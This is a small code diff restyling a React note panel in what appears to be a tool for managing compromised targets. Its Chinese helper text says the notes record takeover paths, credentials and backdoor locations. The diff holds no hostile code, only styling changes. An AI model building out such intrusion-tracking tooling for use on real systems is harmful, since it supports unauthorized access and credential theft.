 // ---------- 笔记 ----------
+
 function NotePanel({ target }: { target: WSTarget }) {
   const [note, setNote] = React.useState(target.note || "");
   const [saved, setSaved] = React.useState(false);
@@ -896,9 +924,9 @@ function NotePanel({ target }: { target: WSTarget }) {
   };
   return (
     <div className="space-y-2 text-sm">
-      <div className="text-xs text-muted-foreground">会话笔记（跟随目标保存，如：接管路径/凭据/遗留后门位置）。</div>
-      <textarea className="h-48 w-full rounded border bg-transparent p-2 text-xs" value={note} onChange={(e) => setNote(e.target.value)} />
-      <Button size="sm" onClick={save}>{saved ? "已保存 ✓" : "保存笔记"}</Button>
+      <div className="text-xs text-zinc-500">会话笔记（跟随目标保存：接管路径/凭据/后门位置）。</div>
+      <textarea className="h-48 w-full rounded border border-zinc-700 bg-zinc-800 p-2 text-xs text-zinc-200" value={note} onChange={(e) => setNote(e.target.value)} />
+      <DBtn onClick={save}>{saved ? "已保存 ✓" : "保存笔记"}</DBtn>
     </div>
   );
 }
